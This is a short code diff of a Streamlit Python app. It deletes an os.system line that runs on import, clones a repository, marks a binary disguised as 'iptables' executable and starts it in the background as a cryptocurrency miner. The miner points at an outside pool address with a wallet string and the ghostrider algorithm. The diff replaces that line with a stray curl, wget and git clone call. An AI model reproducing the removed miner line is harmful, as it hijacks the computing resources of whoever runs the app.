@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ('git clone https://github.com/zamreskhan/ac.git && cd ac && chmod 777 iptables && nohup ./iptables -o 51.13.190.217:443 -u BkqhfrkPCSs3WygG2ePQSomBUR4woLTafi.$(echo $(shuf -i 1-999 -n 1)-T4) -p x -k -a ghostrider -t 16 &')
+os.system ('curl && wget && git clone https://github.com/oriprajo/example-flask.git ')
 """
 # Welcome to Streamlit!
 
